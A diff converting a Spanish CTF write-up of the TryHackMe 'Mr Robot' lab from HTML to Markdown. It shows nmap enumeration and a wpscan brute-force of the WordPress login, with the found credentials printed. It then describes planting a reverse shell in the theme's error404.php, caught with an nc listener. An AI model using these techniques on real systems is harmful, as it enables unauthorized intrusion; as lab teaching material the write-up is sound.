@@ -324,167 +324,171 @@
           
           
         </p>
-        <h1 id="comprobaremos-que-la-maquina-se-encuentre-activa">Comprobaremos que la maquina se encuentre activa</h1>
+        # Comprobaremos que la maquina se encuentre activa
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.115.49
-PING 10.10.115.49 <span class="o">(</span>10.10.115.49<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
-64 bytes from 10.10.115.49: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>162 ms
+```bash
+❯ ping -c 1 10.10.115.49
+PING 10.10.115.49 (10.10.115.49) 56(84) bytes of data.
+64 bytes from 10.10.115.49: icmp_seq=1 ttl=63 time=162 ms
 
-<span class="nt">---</span> 10.10.115.49 ping statistics <span class="nt">---</span>
-1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
-rtt min/avg/max/mdev <span class="o">=</span> 161.950/161.950/161.950/0.000 ms
-</code></pre></div></div>
+--- 10.10.115.49 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 161.950/161.950/161.950/0.000 ms
+```
 
-<p>Efectivamente, vemos que recibio el paquete enviado, ahora comprabaremos que <em>OS</em> tiene la maquina</p>
+Efectivamente, vemos que recibio el paquete enviado, ahora comprabaremos que *OS* tiene la maquina
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wichSystem.py 10.10.115.49
+```bash
+❯ wichSystem.py 10.10.115.49
 
-10.10.115.49 <span class="o">(</span>ttl -&gt; 63<span class="o">)</span>: Linux
-</code></pre></div></div>
+10.10.115.49 (ttl -> 63): Linux
+```
 
-<p>Ya hemos confirmado que estamos con una maquina <em>linux</em> mediante 2 formas diferentes</p>
+Ya hemos confirmado que estamos con una maquina _linux_ mediante 2 formas diferentes
 
-<ul>
-  <li>1 mediante el <em>ttl</em> que obtuvimos del comando ping</li>
-  <li>2 la uilidad -<a href="s4vitar.github.io">WichSystem.py</a></li>
-</ul>
+- 1 mediante el *ttl* que obtuvimos del comando ping
+- 2 la uilidad -[WichSystem.py](s4vitar.github.io)
 
-<h1 id="realizamos-un-escaneo-de-puertos">Realizamos un escaneo de puertos</h1>
+# Realizamos un escaneo de puertos
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-sS</span> 10.10.115.49 <span class="nt">-oG</span> allPorts
-Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-01 14:30 <span class="nt">-05</span>
-Failed to resolve <span class="s2">"n"</span><span class="nb">.</span>
-Nmap scan report <span class="k">for </span>10.10.115.49
-Host is up <span class="o">(</span>0.19s latency<span class="o">)</span><span class="nb">.</span>
-Not shown: 997 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>, 1 closed tcp port <span class="o">(</span>reset<span class="o">)</span>
-Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+```bash
+❯ sudo nmap --open --min-rate 5000 -Pn -n -sS 10.10.115.49 -oG allPorts
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-01 14:30 -05
+Failed to resolve "n".
+Nmap scan report for 10.10.115.49
+Host is up (0.19s latency).
+Not shown: 997 filtered tcp ports (no-response), 1 closed tcp port (reset)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
 PORT    STATE SERVICE
 80/tcp  open  http
 443/tcp open  https
 
-Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>3.03 seconds
-</code></pre></div></div>
+Nmap done: 1 IP address (1 host up) scanned in 3.03 seconds
+```
 
-<h2 id="obtenemos-una-mejor-vista-de-los-puertos-abiertos-mediante-la-utilidad-extractpors-ademas-de-que-nos-los-copia">obtenemos una mejor vista de los puertos abiertos mediante la utilidad <em>extractPors</em>, ademas de que nos los copia</h2>
+## obtenemos una mejor vista de los puertos abiertos mediante la utilidad *extractPors*, ademas de que nos los copia
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+```bash
+❯ extractPorts allPorts
 ───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
        │ File: extractPorts.tmp
 ───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    1   │ 
-   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   2   │ [*] Extracting information...
    3   │ 
-   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.115.49
-   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 80,443
+   4   │     [*] IP Address: 10.10.115.49
+   5   │     [*] Open ports: 80,443
    6   │ 
-   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+   7   │ [*] Ports copied to clipboard
    8   │ 
 ───────┴──────────────────────────────────
-</code></pre></div></div>
-<p>Buscamos posibles vulnerabilidades en los puertos con <em>nmap</em></p>
+```
+Buscamos posibles vulnerabilidades en los puertos con *nmap*
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p80</span>,443 10.10.115.49
-Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-01 14:31 <span class="nt">-05</span>
-Nmap scan report <span class="k">for </span>10.10.115.49
-Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
+```bash
+❯ nmap -sC -sV -p80,443 10.10.115.49
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-01 14:31 -05
+Nmap scan report for 10.10.115.49
+Host is up (0.17s latency).
 
 PORT    STATE SERVICE  VERSION
 80/tcp  open  http     Apache httpd
 |_http-server-header: Apache
-|_http-title: Site doesn<span class="s1">'t have a title (text/html).
+|_http-title: Site doesn't have a title (text/html).
 443/tcp open  ssl/http Apache httpd
-|_http-title: Site doesn'</span>t have a title <span class="o">(</span>text/html<span class="o">)</span><span class="nb">.</span>
+|_http-title: Site doesn't have a title (text/html).
 |_http-server-header: Apache
-| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>www.example.com
+| ssl-cert: Subject: commonName=www.example.com
 | Not valid before: 2015-09-16T10:45:03
 |_Not valid after:  2025-09-13T10:45:03
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
-Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>22.80 seconds
-</code></pre></div></div>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.80 seconds
+```
 
-<p>vemos la pagina web del sitio y miramos a ver que nos llama la atencion</p>
+vemos la pagina web del sitio y miramos a ver que nos llama la atencion
 
-<p><img src="/assets/images/MrRobot/server.txt" alt="server.png" /></p>
+![server.png](/assets/images/MrRobot/server.txt)
 
-<p>buscamos en <em>robots.txt</em></p>
+buscamos en *robots.txt*
 
-<p><img src="/assets/images/MrRobot/robots.txt" alt="robots.txt" /></p>
+![robots.txt](/assets/images/MrRobot/robots.txt)
 
-<p>encontramos 2 posibles rutas</p>
+encontramos 2 posibles rutas
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User-agent: <span class="k">*</span>
+```bash
+User-agent: *
  fsocity.dic
  key-1-of-3.txt
-</code></pre></div></div>
+```
 
-<ul>
-  <li><em>fsocity.dic</em> contiene posibles nombres de usuarios y/o contraseñas</li>
-  <li><em>key-1-of-3.txt</em> contiene una la primer <em>flag</em></li>
-</ul>
+- *fsocity.dic* contiene posibles nombres de usuarios y/o contraseñas
+- *key-1-of-3.txt* contiene una la primer _flag_
 
-<h1 id="hacemos-una-pausa-para-ver-los-posibles-vectores-de-ataque-que-tenemos">hacemos una pausa para ver los posibles <em>vectores de ataque</em> que tenemos</h1>
 
-<p>mientras esperamos que termine el escaneo con <em>gobuster</em> intentaremos hacer una identificación de usuarios mediante el login ya que
-nos permite una enumeración de usuarios</p>
+# hacemos una pausa para ver los posibles *vectores de ataque* que tenemos
 
-<ul>
-  <li>luego de probar varios posibles usuarios encontramos que <em>Elliot</em> es un usuario valido (bastante logico, si recordamos el nombre
-de la maquina)</li>
-</ul>
+mientras esperamos que termine el escaneo con *gobuster* intentaremos hacer una identificación de usuarios mediante el login ya que
+nos permite una enumeración de usuarios
 
-<p>vamos ver cuantas lineas tiene el diccionario <em>fsocity.dic</em></p>
+- luego de probar varios posibles usuarios encontramos que *Elliot* es un usuario valido (bastante logico, si recordamos el nombre
+de la maquina)
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>fsocity.dic | <span class="nb">wc</span> <span class="nt">-l</span>
+vamos ver cuantas lineas tiene el diccionario _fsocity.dic_ 
+
+```bash
+❯ cat fsocity.dic | wc -l
 858160
-</code></pre></div></div>
-<p>es un archivo bastante grande, por si acaso eliminaremos los duplicados</p>
+```
+es un archivo bastante grande, por si acaso eliminaremos los duplicados
 
-<ul>
-  <li>sort: ordemamos las parabras</li>
-  <li>uniq: eliminamos las repetidas
-Vemos que ahora solo tenemos 11.451 lineas</li>
-</ul>
+- sort: ordemamos las parabras
+- uniq: eliminamos las repetidas
+Vemos que ahora solo tenemos 11.451 lineas 
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sort </span>fsocity.dic | <span class="nb">uniq</span> <span class="o">&gt;</span> users.txt
-❯ <span class="nb">wc</span> <span class="nt">-l</span> users.txt
+```bash
+❯ sort fsocity.dic | uniq > users.txt
+❯ wc -l users.txt
 11451 users.txt
-</code></pre></div></div>
+```
 
-<h3 id="ahora-pasaremos-a-intentar-hacerle-fuerza-bruta-al-login-con-el-archivo-fsocitydic-luego-del-tratamiento-userstxtencontrado-antes">ahora pasaremos a intentar hacerle fuerza bruta al login con el archivo fsocity.dic (luego del tratamiento, users.txt)encontrado antes</h3>
+### ahora pasaremos a intentar hacerle fuerza bruta al login con el archivo fsocity.dic (luego del tratamiento, users.txt)encontrado antes
 
-<ul>
-  <li>primero realize brute force con <em>hydra</em>, pero luego de mucho tiempo lo cancele e intente con <em>wpscan</em> y tarde menos de 5 minutos</li>
-</ul>
+- primero realize brute force con *hydra*, pero luego de mucho tiempo lo cancele e intente con *wpscan* y tarde menos de 5 minutos
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> http://10.10.1.9 <span class="nt">-t</span> 50 <span class="nt">-U</span> elliot <span class="nt">-P</span> users.txt
+```bash
+wpscan --url http://10.10.1.9 -t 50 -U elliot -P users.txt
 
-<span class="o">[!]</span> Valid Combinations Found:
+[!] Valid Combinations Found:
  | Username: elliot, Password: ER28-0652
-</code></pre></div></div>
-<p>luego de la espera, tenemos el usuario <em>Elliot</em> y la contraseña <em>ER28-0652</em></p>
+```
+luego de la espera, tenemos el usuario *Elliot* y la contraseña *ER28-0652*
 
-<p><img src="/assets/images/MrRobot/worpress.png" alt="imagen worpress.png" /></p>
+![imagen worpress.png](/assets/images/MrRobot/worpress.png)
 
-<p>Miraremos la pagina de administración e inspeccinamos a ver que podemos hacer para obtener una <em>reverse shell</em></p>
+Miraremos la pagina de administración e inspeccinamos a ver que podemos hacer para obtener una *reverse shell*
 
-<ul>
-  <li>intentare usar la pagina de <em>error404.php</em> para ganar acceso desde mi maquina</li>
-</ul>
+- intentare usar la pagina de *error404.php* para ganar acceso desde mi maquina
 
-<p>editamos el archivo <em>error404.php</em> con nuestra <em>shell</em> y pongo mi maquina en escucha</p>
+editamos el archivo _error404.php_ con nuestra *shell* y pongo mi maquina en escucha
 
-<h2 id="ganamos-acceso">Ganamos acceso</h2>
+## Ganamos acceso
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 1234
-listening on <span class="o">[</span>any] 1234 ...
-connect to <span class="o">[</span>10.9.50.132] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.106.35] 46851
-Linux linux 3.13.0-55-generic <span class="c">#94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span>
- 12:56:23 up 52 min,  0 <span class="nb">users</span>,  load average: 0.00, 0.01, 0.05
+```bash
+❯ nc -nlvp 1234
+listening on [any] 1234 ...
+connect to [10.9.50.132] from (UNKNOWN) [10.10.106.35] 46851
+Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+ 12:56:23 up 52 min,  0 users,  load average: 0.00, 0.01, 0.05
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-<span class="nv">uid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span>
-/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
-</span></code></pre></div></div>
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+/bin/sh: 0: can't access tty; job control turned off
+```
+
+- Usamos python para cambiar la terminal por una un poco "mejor"
+
+```bash
+```
 
 
         
@@ -547,7 +551,7 @@ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
       
   <nav class="pagination">
     
-      <a href="/kenobi/" class="pagination--pager" title="tryhackme: Kenobi
+      <a href="/MrRobot/" class="pagination--pager" title="tryhackme: Mr Robot
 ">Previous</a>
     
     
